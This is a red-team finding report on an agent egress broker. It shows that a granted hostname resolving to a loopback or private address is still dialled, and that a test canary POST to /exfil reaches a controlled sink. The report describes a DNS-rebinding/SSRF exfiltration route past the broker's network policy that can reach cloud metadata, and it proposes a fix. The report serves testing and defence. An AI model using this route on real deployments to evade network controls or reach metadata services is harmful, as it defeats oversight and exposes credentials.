# 04 — A granted name resolving to loopback/private is dialled (04 §2 step 3 absent): canary reaches a sink

**Status:** confirmed, reproducible. **Scope note:** `docs/policy-schema.md`
says §2 steps 3–6 belong to later chunks, and `spec/PROGRESS.md` lists
M2.5 (which builds the upstream address check) as TODO. The behaviour
below is therefore a known-missing control rather than an unexpected
implementation bug — but it is the only cross-upstream exfiltration path
I got, and the brief names controlled DNS answers as an attack, so it is
recorded as a finding the supervisor can weigh.

## Property

`spec/04-policy-and-reconciliation.md` §2, step 3:

> **Upstream address check.** The broker resolves the name once and
> connects to that address. Loopback, link-local (including
> `169.254.169.254`), private, unique-local and cluster service/pod
> ranges → `UPSTREAM_BLOCKED` unless `network: cluster`. The resolved
> address is recorded.

`spec/01-threat-model.md` §2, G3:

> Move data to a destination the policy does not allow … DNS tunnelling

The default for `match.network` is `public` (`04` §1), so a policy that
does not say `network: cluster` must refuse a loopback/private answer.

## What I did

One session with a single granted host, `allowed.example.com`, and no
`network: cluster` (default `public`). I started a TLS sink we control on
loopback, with a certificate for `allowed.example.com` under the test
root, and made the harness resolver answer `allowed.example.com` with the
sink's loopback address. Then:

```
POST https://allowed.example.com/exfil
body: CANARY-RT-DNS
```

```
internal/proxy/rt_dns_upstream_blocked_test.go
go test -tags fixtures ./internal/proxy -run TestRTDNSUpstreamBlocked -count=1 -v
```

## What happened

```
granted name resolved to a loopback address and the broker dialed it:
sink received POST /exfil body="CANARY-RT-DNS" (status 200, client err <nil>)
```

The client got `200`; the sink received the canary; the result record's
`upstream.ip` is the *name* `allowed.example.com` (see finding 06), so
the evidence does not even show the loopback peer. Nothing in the broker
rejects the loopback address.

## What should have happened

`UPSTREAM_BLOCKED`; no connection to the resolved address and no bytes
forwarded. For `169.254.169.254`, `127.0.0.0/8`, `10/8`, `172.16/12`,
`192.168/16`, `fc00::/7`, `fe80::/10`, `0.0.0.0`, IPv4-mapped forms and
cluster ranges, the same refusal applies unless the grant opted in with
`network: cluster`. The check must use the single address that is dialled
(resolve once; no re-resolution).

## Impact

In a deployment where the broker's DNS answer for a granted name can be
influenced (compromised resolver, hostile authoritative domain for a
granted wildcard, DNS rebinding), an agent can reach loopback services
and cloud metadata — an SSRF/exfiltration path — even though the policy
grants only one public name. Local-mode fixtures deliberately resolve to
loopback, so a fix has to keep a fixture/cluster exemption; that does not
make the public-policy case safe.

## Confidence

High that the current code has no address check and delivers the canary
(two clean runs). The classification of this as a finding rather than a
known M2.5 gap is the supervisor's call; the docs and progress say the
chunk is TODO.

## Fix direction (not applied)

Resolve once in `forward`'s dial path, check the address against the
blocked ranges unless `network: cluster`, dial that exact address (pin
it for the TLS handshake), and record it in `upstream.ip`.
